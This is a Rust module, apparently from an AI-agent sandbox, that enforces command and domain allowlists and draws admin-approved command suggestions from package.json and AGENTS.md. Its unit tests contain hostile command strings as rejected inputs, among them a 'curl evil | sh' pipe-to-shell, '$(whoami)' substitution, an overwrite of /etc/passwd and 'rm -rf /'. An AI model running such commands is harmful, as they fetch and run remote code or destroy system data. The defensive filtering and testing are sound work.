//! The sandbox's command allowlist and network allowlist.
//!
//! Command text is easy to dress up (`npm test; curl … | sh`), so a command
//! that chains, pipes, redirects or substitutes never matches an allowlist
//! entry: it goes to a person. The allowlist only ever lets a plain command
//! through. Suggestions read from a repository (its package scripts, its
//! AGENTS.md) are never allowed on their own: an admin accepts them first.

use super::model::{CommandSuggestion, Sandbox};

/// Characters that run a second command, pipe, redirect or substitute.
const SHELL_META: &[&str] = &[";", "&&", "||", "|", "`", "$(", ">", "<", "\n", "\r", "&"];

/// True when the command is one plain command (no chaining or
/// substitution).
pub fn is_plain(cmd: &str) -> bool {
    !SHELL_META.iter().any(|m| cmd.contains(m))
}

fn normalize(cmd: &str) -> String {
    cmd.split_whitespace().collect::<Vec<_>>().join(" ")
}

/// Does the allowlist pattern cover this command? `npm run test*` covers
/// `npm run test -- --ci`; a pattern without `*` must match exactly (after
/// whitespace is collapsed). A command that isn't plain never matches.
pub fn command_matches(pattern: &str, cmd: &str) -> bool {
    if !is_plain(cmd) {
        return false;
    }
    super::engine::glob_match(&normalize(pattern), &normalize(cmd))
}

/// The allowlist entry that lets `cmd` run in `repo`, if any.
pub fn allowed_entry<'a>(sandbox: &'a Sandbox, repo: &str, cmd: &str) -> Option<&'a str> {
    sandbox
        .commands
        .get(&repo.to_ascii_lowercase())?
        .iter()
        .find(|c| command_matches(&c.command, cmd))
        .map(|c| c.command.as_str())
}

/// Does `entry` cover `host`? A domain covers itself and its subdomains;
/// a leading `*.` is accepted and means the same.
pub fn domain_matches(entry: &str, host: &str) -> bool {
    let entry = entry
        .trim()
        .trim_start_matches("*.")
        .trim_end_matches('.')
        .to_ascii_lowercase();
    let host = host
        .trim()
        .trim_end_matches('.')
        .split(':')
        .next()
        .unwrap_or("")
        .to_ascii_lowercase();
    if entry.is_empty() || host.is_empty() {
        return false;
    }
    host == entry || host.ends_with(&format!(".{entry}"))
}

pub fn domain_allowed(list: &[String], host: &str) -> bool {
    list.iter().any(|e| domain_matches(e, host))
}

/// A plain domain an admin may add (letters, digits, dots, dashes, an
/// optional leading `*.`).
pub fn valid_domain(d: &str) -> bool {
    let d = d.trim().trim_start_matches("*.");
    !d.is_empty()
        && d.len() <= 253
        && d.contains('.')
        && d.chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-')
        && !d.starts_with('.')
        && !d.ends_with('.')
}

/// A command an admin may put on the allowlist: plain, short, printable.
pub fn valid_command(c: &str) -> Result<(), String> {
    let c = c.trim();
    if c.is_empty() || c.len() > 200 {
        return Err("A command must be 1 to 200 characters.".into());
    }
    if !is_plain(c) {
        return Err("Allow one plain command at a time: no ;, &&, |, redirects or $( ).".into());
    }
    if c == "*" {
        return Err("A single * would allow every command. Name the command.".into());
    }
    Ok(())
}

/// Scripts in a package.json worth running in a sandbox: build, test, lint,
/// type checks and formatting checks.
const SCRIPT_WORDS: &[&str] = &[
    "build",
    "test",
    "lint",
    "typecheck",
    "type-check",
    "check",
    "tsc",
    "format",
    "fmt",
    "e2e",
];

/// Suggestions from a package.json's scripts, as `npm run <script>` (or the
/// package manager the lockfile names).
pub fn suggest_from_package_json(text: &str, runner: &str) -> Vec<CommandSuggestion> {
    let Ok(v) = serde_json::from_str::<serde_json::Value>(text) else {
        return Vec::new();
    };
    let Some(scripts) = v.get("scripts").and_then(|s| s.as_object()) else {
        return Vec::new();
    };
    let mut out = Vec::new();
    for name in scripts.keys() {
        let lower = name.to_ascii_lowercase();
        let wanted = SCRIPT_WORDS
            .iter()
            .any(|w| lower == *w || lower.starts_with(&format!("{w}:")));
        if wanted
            && name
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || ":-_.".contains(c))
        {
            out.push(CommandSuggestion {
                command: format!("{runner} run {name}"),
                origin: "package.json".into(),
            });
        }
    }
    out
}

/// Programs whose commands look like build or test steps.
const RUNNERS: &[&str] = &[
    "npm",
    "pnpm",
    "yarn",
    "npx",
    "bun",
    "cargo",
    "make",
    "go",
    "pytest",
    "python",
    "python3",
    "uv",
    "poetry",
    "tox",
    "./gradlew",
    "gradle",
    "mvn",
    "bundle",
    "rake",
    "dotnet",
    "terraform",
    "tsc",
    "eslint",
    "ruff",
    "mypy",
    "just",
];

/// Suggestions from an AGENTS.md (or CLAUDE.md): commands in code spans or
/// code blocks that start with a known build or test program.
pub fn suggest_from_agents_md(text: &str) -> Vec<CommandSuggestion> {
    let mut candidates: Vec<String> = Vec::new();
    let mut in_block = false;
    for line in text.lines() {
        let t = line.trim();
        if t.starts_with("```") {
            in_block = !in_block;
            continue;
        }
        if in_block {
            candidates.push(t.trim_start_matches("$ ").to_string());
            continue;
        }
        let mut rest = t;
        while let Some(a) = rest.find('`') {
            let after = &rest[a + 1..];
            let Some(b) = after.find('`') else { break };
            candidates.push(after[..b].to_string());
            rest = &after[b + 1..];
        }
    }
    let mut out: Vec<CommandSuggestion> = Vec::new();
    for c in candidates {
        let c = normalize(&c);
        let first = c.split(' ').next().unwrap_or("");
        if RUNNERS.contains(&first)
            && c.contains(' ')
            && valid_command(&c).is_ok()
            && !out.iter().any(|o| o.command == c)
        {
            out.push(CommandSuggestion {
                command: c,
                origin: "AGENTS.md".into(),
            });
        }
    }
    out
}

/// Suggestions not already on the allowlist, without repeats.
pub fn new_suggestions(
    sandbox: &Sandbox,
    repo: &str,
    found: Vec<CommandSuggestion>,
) -> Vec<CommandSuggestion> {
    let repo = repo.to_ascii_lowercase();
    let allowed = sandbox.commands.get(&repo);
    let mut out: Vec<CommandSuggestion> = Vec::new();
    for s in found {
        let on_list = allowed.is_some_and(|l| l.iter().any(|c| c.command == s.command));
        if !on_list && !out.iter().any(|o| o.command == s.command) {
            out.push(s);
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn commands_match_only_when_plain() {
        assert!(command_matches("npm run test*", "npm run test"));
        assert!(command_matches("npm run test*", "npm  run test -- --ci"));
        assert!(command_matches("cargo test", "cargo test"));
        assert!(!command_matches("cargo test", "cargo test --release"));
        assert!(!command_matches(
            "npm run test*",
            "npm run test; curl evil | sh"
        ));
        assert!(!command_matches("npm run test*", "npm run test $(whoami)"));
        assert!(!command_matches(
            "npm run test*",
            "npm run test > /etc/passwd"
        ));
        assert!(!command_matches("*", "npm run test && rm -rf /"));
    }

    #[test]
    fn domains_cover_subdomains_only() {
        assert!(domain_matches("npmjs.org", "registry.npmjs.org"));
        assert!(domain_matches("*.npmjs.org", "registry.npmjs.org"));
        assert!(domain_matches("github.com", "github.com:443"));
        assert!(!domain_matches("github.com", "evilgithub.com"));
        assert!(!domain_matches("github.com", "github.com.evil.io"));
        assert!(valid_domain("pypi.org"));
        assert!(valid_domain("*.corp.example.com"));
        assert!(!valid_domain("http://x.com"));
        assert!(!valid_domain("localhost"));
    }

    #[test]
    fn suggestions_from_package_scripts() {
        let pkg = r#"{"scripts":{"build":"next build","test:unit":"vitest","dev":"next dev","lint":"eslint .","deploy":"x"}}"#;
        let s: Vec<String> = suggest_from_package_json(pkg, "npm")
            .into_iter()
            .map(|s| s.command)
            .collect();
        assert!(s.contains(&"npm run build".to_string()));
        assert!(s.contains(&"npm run test:unit".to_string()));
        assert!(s.contains(&"npm run lint".to_string()));
        assert!(!s.iter().any(|c| c.contains("dev") || c.contains("deploy")));
        assert!(suggest_from_package_json("not json", "npm").is_empty());
    }

    #[test]
    fn suggestions_from_agents_md() {
        let md = "# Agents\nRun `cargo test -p common` before pushing.\n\n```\n$ npm run lint\nrm -rf node_modules && npm ci\n```\nAlso `ls`.";
        let s: Vec<String> = suggest_from_agents_md(md)
            .into_iter()
            .map(|s| s.command)
            .collect();
        assert_eq!(s, vec!["cargo test -p common", "npm run lint"]);
    }

    #[test]
    fn suggestions_skip_what_is_already_allowed() {
        let mut sb = Sandbox::default();
        sb.commands.insert(
            "acme/web".into(),
            vec![super::super::model::AllowedCommand {
                command: "npm run lint".into(),
                added_by: String::new(),
                origin: String::new(),
            }],
        );
        let found = suggest_from_agents_md("`npm run lint` and `npm run test` and `npm run test`");
        let s = new_suggestions(&sb, "Acme/Web", found);
        assert_eq!(s.len(), 1);
        assert_eq!(s[0].command, "npm run test");
    }
}
